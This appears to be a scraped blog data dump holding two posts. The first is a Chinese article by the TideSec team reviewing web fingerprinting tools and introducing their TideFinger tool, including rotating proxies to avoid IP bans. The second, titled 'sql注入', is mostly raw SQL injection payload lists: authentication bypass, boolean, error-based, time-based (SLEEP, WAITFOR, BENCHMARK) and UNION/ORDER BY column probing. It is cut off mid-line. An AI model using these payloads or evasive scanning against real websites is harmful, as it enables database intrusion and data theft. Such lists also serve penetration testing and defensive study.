是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。 123Whatweb 是基于 ruby 语言开发，因此可以安装在具备 ruby 环境的系统中，目前支持 Windows/Mac OSX/Linux。在debian/ubuntu系统下可直接`apt-get install whatweb`,kali已自带。 使用非常简单whatweb http://www.tidesec.net即可，也可以加参数-v显示更详细的信息。 Wapplyzer（推荐指数★★★★）下载地址：https://github.com/AliasIO/Wappalyzer Wappalyzer 是一个实用的跨平台网站分析工具，用于帮助开发者、研究者和设计者检测网页使用的是什么技术，以更好地衡量自己的项目中该使用什么技术。Wappalyzer 的功能和 BuiltWith 类似，可检测内容管理系统（CMS），电子商务平台、Web服务器、JavaScript框架和已安装的分析工具等。 Wappalyzer可直接在chrome或火狐的应用商城直接搜索安装。Wappalyzer目前可识别65个大类的1216个应用，查看可检测的应用程序列表：https://wappalyzer.com/applications Whatruns（推荐指数★★★★）Whatruns是为chrome开发的一款web指纹识别程序，还可以显示托管的CDN、wordpress插件、wordpress字体等，拥有丰富的插件支持。 跟Wappalyzer安装类似，Whatruns可直接在chrome应用商城直接搜索安装。 安装完成后，通过插件图标来获取服务的详细运行信息，效果如下。有时候信息会比Wapplyzer还详细一些，但有时候获取速度稍慢。 Plecost（推荐指数★★★）下载地址：https://github.com/iniqua/plecost Plecost是Wordpress博客引擎的漏洞指纹识别和漏洞查找器，能识别Wordpress版本并能查找到cve，不过访问不了google的话可能有些功能就受限了。Plecost基于python架构，利用了Beautiful Soup来解析html、xml文件识别网站使用的插件及版本。 使用也比较方便 plecost -i /usr/share/plecost/wp_plugin_list.txt http://www.freebuf.com BlindElephant（推荐指数★★）下载地址：https://github.com/lokifer/BlindElephant BlindElephant是一款Web应用程序指纹识别工具。该工具可以读取目标网站的特定静态文件，计算其对应的哈希值，然后和预先计算出的哈希值做对比，从而判断目标网站的类型和版本号。目前，该工具支持15种常见的Web应用程序的几百个版本。同时，它还提供WordPress和Joomla的各种插件。该工具还允许用户自己扩展，添加更多的版本支持。 不过该软件最新更新是在2013年，插件库应该算比较旧的了。 下载及安装可参考https://github.com/lokifer/BlindElephant，kali中已经内置。 使用命令：BlindElephant.py http://www.freebuf.com wordpress 国内指纹识别工具御剑web指纹识别程序下载地址：https://www.webshell.cc/4697.html 御剑web指纹识别程序是一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少。 windows下图形界面，比较亲民，扫描速度略慢，指纹库略少，可手工更新。 Test404轻量WEB指纹识别下载地址：https://www.test404.com/post-1618.html Test404轻量WEB指纹识别程序是一款CMS指纹识别小工具，配置灵活、支持自行添加字典、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快。可手动更新指纹识别库，而且该软件在2019.04月刚刚更新了一版。 w11scan分布式WEB指纹识别平台w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增&#x2F;修改指纹，建立批量的扫描任务，并且支持多种搜索语法。 安装和下载可参考：https://github.com/w-digital-scanner/w11scan 手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。 Dayu指纹识别工具下载地址：https://github.com/Ms0x0/Dayu “大禹”为一款c&#x2F;s结构jar文件工具，只需本地安装java环境，加参数-u即可，具体设置参数可参考github介绍。 WebEye下载地址：https://github.com/zerokeeper/WebEye/ WebEye可快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架，使用异步实现指纹的快速识别。 识别速度比较快，不过指纹库不是很多，指纹库不是基于md5之类的，而是类似于fofa通过http头信息、关键字等进行快速识别。 作者对指纹进行了分类，如摄像头、waf、cdn、网络设备等，很多指纹都是精心搜集的。 WTF_Scan下载地址：https://github.com/dyboy2017/WTF_Scan WTF团队出品的指纹识别平台，包括的功能也相对比较多，除了指纹识别外，还有DNS解析、子域名、CDN、端口扫描、敏感目录等。 不过就单独说指纹规则来说，不算很多，可以自己添加完善，在WTF_Scan/wtf/app/api/cms/cms.txt文件中进行指纹修改。 Webfinger基于fofa的规则库进行快速检索，大约2000+条指纹数据，位于lib&#x2F;web.db可自行添加修改。 下载地址：https://github.com/se55i0n/Webfinger 类似的还有个CMSCANhttps://github.com/cuijianxiong/cmscan/ FingerPrint好像是百度的一个MM用perl写的一款工具，调用Wappalyzer模块进行指纹识别。 下载地址：https://github.com/tanjiti/FingerPrint 在线指纹识别云悉指纹识别http://www.yunsee.cn/ 指纹库很强大，速度也很快，我们前端还仿了下云悉的界面，免费服务，还能提供api接口！ 如果指纹能开源就好了，哈哈~~ bugscaner指纹识别http://whatweb.bugscaner.com/look/ 目前好像指纹比较少，很多都识别不出来了。 whatweb.nethttps://whatweb.net/ 之前功能还不错，现在好像只能查看到header信息了。 TideFinger上面介绍了那么多超级工具，都不好意思写自己做的小破烂东西了…大佬们可以关掉本页面了… 通过对各种识别对象、识别方法、识别工具的分析，发现大家的指纹库各式各样，识别方式也是各有千秋，传统的md5、url路径的方式居多，识别header信息的也是不少，但没有一个能集众家之长的小工具。 于是我们就做了一个小工具TideFinger 1https://github.com/TideSec/TideFinger 指纹库整理我们搜集了上面所有的指纹软件，从中提取了指纹库，进行了统一的格式化处理并进行去重，最终得到了一个大约2078条的传统指纹库。本来想把fofa的库也合并进来，发现格式差异有些大，便保持了fofa指纹库，并把WebEye的部分指纹和fofa指纹进行了合并。这样就保留了两个指纹库，其中cms指纹库为传统的md5、url库，大约2078条指纹，可通过关键字、md5、正则进行匹配，fofa库为2119指纹，主要对Header、url信息进行匹配。 指纹库优化在对指纹库整理去重后，对每个指纹进行了命中率的标识，当匹配到某个指纹时该指纹命中率会加1，而在使用指纹时会从优先使用命中率高的指纹。 然后我们从互联网中爬取了10W个域名进行了命中率测试，然后对一些误报率比较高的指纹进行了重新优化，得到了一份相对更高效的指纹库。 未知指纹发现目前新指纹的识别基本还是靠人工发现然后分析规则再进行添加，所以各平台都有提交指纹的功能，但是我们没有这种资源，只能另想办法。 于是想到了一个比较笨的方法：从网站中爬取一些静态文件，如png、ico、jpg、css、js等，提取url地址、文件名、计算md5写入数据库，这样再爬下一个网站，一旦发现有相同的md5，就把新的url也加入到那条记录中，并把hint值加1，这样爬取10W个站点后，就能得到一个比较客观的不同网站使用相同md5文件的数据了。 获取链接代码部分 1234567891011121314151617181920212223242526272829303132excludeext = [&#x27;.png&#x27;, &#x27;.ico&#x27;, &#x27;.gif&#x27;,&#x27;.svg&#x27;, &#x27;.jpeg&#x27;,&#x27;js&#x27;,&#x27;css&#x27;,&#x27;xml&#x27;,&#x27;txt&#x27;]def getPageLinks(url): try: headers = requests_headers() content = requests.get(url, timeout=5, headers=headers, verify=False).text.encode(&#x27;utf-8&#x27;) links = [] tags = [&#x27;a&#x27;, &#x27;A&#x27;, &#x27;link&#x27;, &#x27;script&#x27;, &#x27;area&#x27;, &#x27;iframe&#x27;, &#x27;form&#x27;] # img tos = [&#x27;href&#x27;, &#x27;src&#x27;, &#x27;action&#x27;] if url[-1:] == &#x27;/&#x27;: url = url[:-1] try: for tag in tags: for to in tos: link1 = re.findall(r&#x27;&lt;%s.*?%s=&quot;(.*?)&quot;&#x27; % (tag, to), str(content)) link2 = re.findall(r&#x27;&lt;%s.*?%s=\\&#x27;(.*?)\\&#x27;&#x27; % (tag, to), str(content)) for i in link1: links.append(i) for i in link2: if i not in links: links.append(i) except Exception, e: print e print &#x27;[!] Get link error&#x27; pass return links except: return [] 有兴趣的可以查看具体代码https://github.com/TideSec/TideFinger/blob/master/count_file_md5.py文件。 爬取的结果如下： 当然了，里面肯定很多都属于误报，比如上图中第一个其实是个500错误页面，所以出现的比较多，第二个是政府网站最下边那个常见的“纠错”的js，所以用的也比较多… 经过一些分析整理也发现了一些小众的CMS和建站系统的指纹，比如三一网络建站系统的newsxx.php，比如大汉JCM的jhelper_tool_style.css等等，后续会持续把这些新的指纹丰富到指纹库中去。 指纹识别脚本有了指纹库之后，识别脚本就相对比较简单了，已有的一些也都比较成熟了，直接使用了webfinger和whatcms的部分代码并进行了整合优化，于是就有了TideFinger。 1、功能逻辑都比较简单，先用fofa库去匹配，然后获取一定banner，如果banner中识别除了cms，则返回结果，如果未识别到cms，则会调用cms规则库进行匹配各规则。 2、脚本支持代理模式，当设置了-p参数，且proxys_ips.txt文件包含代理地址时，脚本会随机调用代理地址进行扫描，以避免被封ip，不过这样的话效率可能会低一些。毕竟搜集的免费代理质量还是差一些，速度会慢很多。有钱人可以找收费代理池，然后每个规则都用不同代理去请求，这样肯定不会被封！ 代理地址的搜集可以使用我修改的另一个代理池https://github.com/TideSec/Proxy_Pool，提供了自动化的代理ip抓取+评估+存储+展示+接口调用。 3、经测试，一般网站把所有指纹跑一遍大约需要30秒时间，个别的网站响应比较慢的可能耗时更长一些，可以通过设置网站超时时间进行控制。 安装python2依赖库 12345pip install lxmlpip install requestspip install bs4说明：sqlite3库在Python 2.5.x 以上版本默认自带了该模块，如提示sqlite3出错请自行排查。 执行脚本 12345678$ python TideFinger.py Usage: python TideFinger.py -u http://www.123.com [-p 1] [-m 50] [-t 5] -u: 待检测目标URL地址 -p: 指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80 -m: 指纹匹配的线程数，不指定时默认为50 -t: 网站响应超时时间，默认为5秒 指纹识别界面如下： 指纹识别平台在有了指纹库和识别脚本之后，我们想继续完善下这个功能，于是又加入了其他一些功能，有了这个在线指纹查询平台http://finger.tidesec.net。 开始想加的很多，但后来在速度和时间方面不得不进行了一定的取舍，于是就有了目前如下的功能。 1、网站信息：网站标题、状态码、302跳转信息等； 2、IP地址信息：IP归属地、IP服务商信息、GPS信息； 3、CDN识别：对目标是否使用CDN进行检测，但目前CDN识别指纹还不多，对部分识别出使用CDN的目标还会列出来CNAME； 4、中间件识别：主要通过http头信息中的XPB、server等字段获取中间件信息，如nginx、iis、tomcat等； 5、更多banner：主要是调用了whatweb和Wapplyzer进行更多banner信息的获取，如jquery、bootstrap等； 6、操作系统识别：识别比较简单，通过ttl值和文件大小写是否敏感…用nmap去识别的话速度太慢… 7、本来还加入了子域名发现、端口扫描和waf探测等等，但发现耗时相对较长，而且比较容易被封IP，所以又去掉了。 团队没有专门做前端的，看云悉界面比较美观，所以就参考了云悉和WTF_Scan的界面布局，大佬不要打我们…使用了TP5框架，因为平台的功能都比较low，以防被喷就不放源码了。 大家可以试用下，给我们提提意见http://finger.tidesec.net 注册需要验证码，关注下我们公众号回复“潮汐指纹”即可被逼拉流量O(∩_∩)O哈哈 待解决的问题1、指纹库的继续完善：这是个旷日持久的工作，希望能坚持下去，我们也会持续的开源最新指纹库，希望大家手头有好的资源也可以贡献出来。 2、代理问题：虽然集成了代理功能，但经实际使用来看，搜集的免费代理质量还是差一些，速度会慢很多。 3、IP会被封：有的网站防护对目录枚举或一些路径非常敏感，会封IP地址； 4、下一步尝试对http头进行语义分析，从海量网站中提取分析header的共性，更高效的发现未知指纹； 5、因为穷，所以目前还是单节点进行指纹的识别，如果是第三步进入常规目录检测的方式的话可能速度会比较慢。 参考资料在指纹库搜集和脚本开发过程中，查阅了大量资料，下面列举的可能不全，在此一并感谢这些无私奉献的安全研究者。 https://www.freebuf.com/articles/2555.html https://blog.51cto.com/simeon/2115190 https://www.freebuf.com/news/137497.html https://www.freebuf.com/articles/web/129939.html https://www.freebuf.com/sectool/135216.html https://www.test404.com/post-1299.html?wafcloud=1 https://github.com/se55i0n/Webfinger https://github.com/tanjiti/FingerPrint https://github.com/dyboy2017/WTF_Scan https://github.com/zerokeeper/WebEye/ https://github.com/Ms0x0/Dayu https://github.com/w-digital-scanner/w11scan https://www.webshell.cc/4697.html https://github.com/lokifer/BlindElephant https://github.com/iniqua/plecost https://github.com/AliasIO/Wappalyzer https://github.com/urbanadventurer/WhatWeb 小福利1、指纹检测工具下载 我们把上面的13款指纹识别工具和搜集到的一些论文资料进行了汇总打包，大家可以直接下载。 下载地址：https://pan.baidu.com/s/190K34cwjAWDUMLtR8EWvNA 提取码：5y4o 解压密码www.tidesec.net 后续如有更新，会在我们公众号TideSec安全团队上提供下载，回复“指纹工具”即可获取最新指纹识别工具下载地址。 2、指纹库下载 我们在GitHub上提供的是2019年4月的指纹库（还未进行大量的命中率测试），后续我们还会优化调整命中策略、未知指纹识别方法，持续更新优化指纹库。 最新指纹库的下载请关注我们公众号TideSec安全团队，回复“指纹库”即可获取最新指纹库下载地址。 关注我们TideSec安全团队： Tide安全团队正式成立于2019年1月，是以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT&#x2F;物联网&#x2F;工控安全等方向。 想了解更多Tide安全团队，请关注团队官网: http://www.TideSec.net 或关注公众号： 和我联系：","categories":[],"tags":[]},{"title":"","slug":"sql注入","date":"2024-02-26T01:22:49.774Z","updated":"2022-05-25T02:57:21.504Z","comments":true,"path":"2024/02/26/sql注入/","permalink":"http://example.com/2024/02/26/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&#x27;&#x27;&#x27;```,&quot;&quot;&quot;///\\\\\\;&#x27; or &quot;-- or # &#x27; OR &#x27;1&#x27; OR 1 -- -&quot; OR &quot;&quot; = &quot;&quot; OR 1 = 1 -- -&#x27; OR &#x27;&#x27; = &#x27;&#x27;=&#x27;&#x27;LIKE&#x27;&#x27;=0--+ OR 1=1&#x27; OR &#x27;x&#x27;=&#x27;x&#x27; AND id IS NULL; --&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;UNION SELECT &#x27;2%00/*…*/ + addition, concatenate (or space in url)|| (double pipe) concatenate% wildcard attribute indicator@variable local variable@@variable global variable# NumericAND 1AND 0AND trueAND false1-false1-true1*56-21&#x27; ORDER BY 1--+1&#x27; ORDER BY 2--+1&#x27; ORDER BY 3--+1&#x27; ORDER BY 1,2--+1&#x27; ORDER BY 1,2,3--+1&#x27; GROUP BY 1,2,--+1&#x27; GROUP BY 1,2,3--+&#x27; GROUP BY columnnames having 1=1 ---1&#x27; UNION SELECT 1,2,3--+&#x27; UNION SELECT sum(columnname ) from tablename ---1 UNION SELECT 1 INTO @,@-1 UNION SELECT 1 INTO @,@,@1 AND (SELECT * FROM Users) = 1 &#x27; AND MID(VERSION(),1,1) = &#x27;5&#x27;;&#x27; and 1 in (select min(name) from sysobjects where xtype = &#x27;U&#x27; and name &gt; &#x27;.&#x27;) --Finding the table nameTime-Based:,(select * from (select(sleep(10)))a)%2c(select%20*%20from%20(select(sleep(10)))a)&#x27;;WAITFOR DELAY &#x27;0:0:30&#x27;--Comments:# Hash comment/* C-style comment-- - SQL comment;%00 Nullbyte` Backtick 基于通用错误的有效负载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154 OR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND (&#x27;pytW&#x27; LIKE &#x27;pytW OR 3409=3409 AND (&#x27;pytW&#x27; LIKE &#x27;pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND &#x27;%&#x27;=&#x27; AND 1=0 AND &#x27;%&#x27;=&#x27; AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND (&#x27;1427=1427 AND 7506=9091 AND (&#x27;5913=5913 AND 7300=7300 AND &#x27;pKlZ&#x27;=&#x27;pKlZ AND 7300=7300 AND &#x27;pKlZ&#x27;=&#x27;pKlY AND 7300=7300 AND (&#x27;pKlZ&#x27;=&#x27;pKlZ AND 7300=7300 AND (&#x27;pKlZ&#x27;=&#x27;pKlY AS INJECTX WHERE 1=1 AND 1=1 AS INJECTX WHERE 1=1 AND 1=0 AS INJECTX WHERE 1=1 AND 1=1# AS INJECTX WHERE 1=1 AND 1=0# AS INJECTX WHERE 1=1 AND 1=1-- AS INJECTX WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5-- ORDER BY 6-- ORDER BY 7-- ORDER BY 8-- ORDER BY 9-- ORDER BY 10-- ORDER BY 11-- ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- ORDER BY 28-- ORDER BY 29-- ORDER BY 30-- ORDER BY 31337-- ORDER BY 1# ORDER BY 2# ORDER BY 3# ORDER BY 4# ORDER BY 5# ORDER BY 6# ORDER BY 7# ORDER BY 8# ORDER BY 9# ORDER BY 10# ORDER BY 11# ORDER BY 12# ORDER BY 13# ORDER BY 14# ORDER BY 15# ORDER BY 16# ORDER BY 17# ORDER BY 18# ORDER BY 19# ORDER BY 20# ORDER BY 21# ORDER BY 22# ORDER BY 23# ORDER BY 24# ORDER BY 25# ORDER BY 26# ORDER BY 27# ORDER BY 28# ORDER BY 29# ORDER BY 30# ORDER BY 31337# ORDER BY 1 ORDER BY 2 ORDER BY 3 ORDER BY 4 ORDER BY 5 ORDER BY 6 ORDER BY 7 ORDER BY 8 ORDER BY 9 ORDER BY 10 ORDER BY 11 ORDER BY 12 ORDER BY 13 ORDER BY 14 ORDER BY 15 ORDER BY 16 ORDER BY 17 ORDER BY 18 ORDER BY 19 ORDER BY 20 ORDER BY 21 ORDER BY 22 ORDER BY 23 ORDER BY 24 ORDER BY 25 ORDER BY 26 ORDER BY 27 ORDER BY 28 ORDER BY 29 ORDER BY 30 ORDER BY 31337 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND &#x27;Txws&#x27;=&#x27; RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND &#x27;Txws&#x27;=&#x27;IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--%&#x27; AND 8310=8310 AND &#x27;%&#x27;=&#x27;%&#x27; AND 8310=8311 AND &#x27;%&#x27;=&#x27; and (select substring(@@version,1,1))=&#x27;X&#x27; and (select substring(@@version,1,1))=&#x27;M&#x27; and (select substring(@@version,2,1))=&#x27;i&#x27; and (select substring(@@version,2,1))=&#x27;y&#x27; and (select substring(@@version,3,1))=&#x27;c&#x27; and (select substring(@@version,3,1))=&#x27;S&#x27; and (select substring(@@version,3,1))=&#x27;X&#x27; 基于时间的通用 SQL 注入负载1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# from wapitisleep(5)#1 or sleep(5)#&quot; or sleep(5)#&#x27; or sleep(5)#&quot; or sleep(5)=&quot;&#x27; or sleep(5)=&#x27;1) or sleep(5)#&quot;) or sleep(5)=&quot;&#x27;) or sleep(5)=&#x27;1)) or sleep(5)#&quot;)) or sleep(5)=&quot;&#x27;)) or sleep(5)=&#x27;;waitfor delay &#x27;0:0:5&#x27;--);waitfor delay &#x27;0:0:5&#x27;--&#x27;;waitfor delay &#x27;0:0:5&#x27;--&quot;;waitfor delay &#x27;0:0:5&#x27;--&#x27;);waitfor delay &#x27;0:0:5&#x27;--&quot;);waitfor delay &#x27;0:0:5&#x27;--));waitfor delay &#x27;0:0:5&#x27;--&#x27;));waitfor delay &#x27;0:0:5&#x27;--&quot;));waitfor delay &#x27;0:0:5&#x27;--benchmark(10000000,MD5(1))#1 or benchmark(10000000,MD5(1))#&quot; or benchmark(10000000,MD5(1))#&#x27; or benchmark(10000000,MD5(1))#1) or benchmark(10000000,MD5(1))#&quot;) or benchmark(10000000,MD5(1))#&#x27;) or benchmark(10000000,MD5(1))#1)) or benchmark(10000000,MD5(1))#&quot;)) or benchmark(10000000,MD5(1))#&#x27;)) or benchmark(10000000,MD5(1))#pg_sleep(5)--1 or pg_sleep(5)--&quot; or pg_sleep(5)--&#x27; or pg_sleep(5)--1) or pg_sleep(5)--&quot;) or pg_sleep(5)--&#x27;) or pg_sleep(5)--1)) or pg_sleep(5)--&quot;)) or pg_sleep(5)--&#x27;)) or pg_sleep(5)--AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#x27;vRxe&#x27;=&#x27;vRxeAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND &#x27;%&#x27;=&#x27;AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#SLEEP(5)#SLEEP(5)--SLEEP(5)=&quot;SLEEP(5)=&#x27;or SLEEP(5)or SLEEP(5)#or SLEEP(5)--or SLEEP(5)=&quot;or SLEEP(5)=&#x27;waitfor delay &#x27;00:00:05&#x27;waitfor delay &#x27;00:00:05&#x27;--waitfor delay &#x27;00:00:05&#x27;#benchmark(50000000,MD5(1))benchmark(50000000,MD5(1))--benchmark(50000000,MD5(1))#or benchmark(50000000,MD5(1))or benchmark(50000000,MD5(1))--or benchmark(50000000,MD5(1))#pg_SLEEP(5)pg_SLEEP(5)--pg_SLEEP(5)#or pg_SLEEP(5)or pg_SLEEP(5)--or pg_SLEEP(5)#&#x27;\\&quot;AnD SLEEP(5)AnD SLEEP(5)--AnD SLEEP(5)#&amp;&amp;SLEEP(5)&amp;&amp;SLEEP(5)--&amp;&amp;SLEEP(5)#&#x27; AnD SLEEP(5) ANd &#x27;1&#x27;&amp;&amp;SLEEP(5)&amp;&amp;&#x27;1ORDER BY SLEEP(5)ORDER BY SLEEP(5)--ORDER BY SLEEP(5)#(SELECT * FROM (SELECT(SLEEP(5)))ecMj)(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--+benchmark(3200,SHA1(1))+&#x27;+ SLEEP(10) + &#x27;RANDOMBLOB(500000000/2)AND 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(500000000/2))))OR 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(500000000/2))))RANDOMBLOB(1000000000/2)AND 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))OR 2947=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))SLEEP(1)/*&#x27; or SLEEP(1) or &#x27;&quot; or SLEEP(1) or &quot;*/ 通用联合选择有效载荷123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419ORDER BY SLEEP(5)ORDER BY 1,SLEEP(5)ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;))ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30ORDER BY SLEEP(5)#ORDER BY 1,SLEEP(5)#ORDER BY 1,SLEEP(5),3#ORDER BY 1,SLEEP(5),3,4#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12#ORDER BY 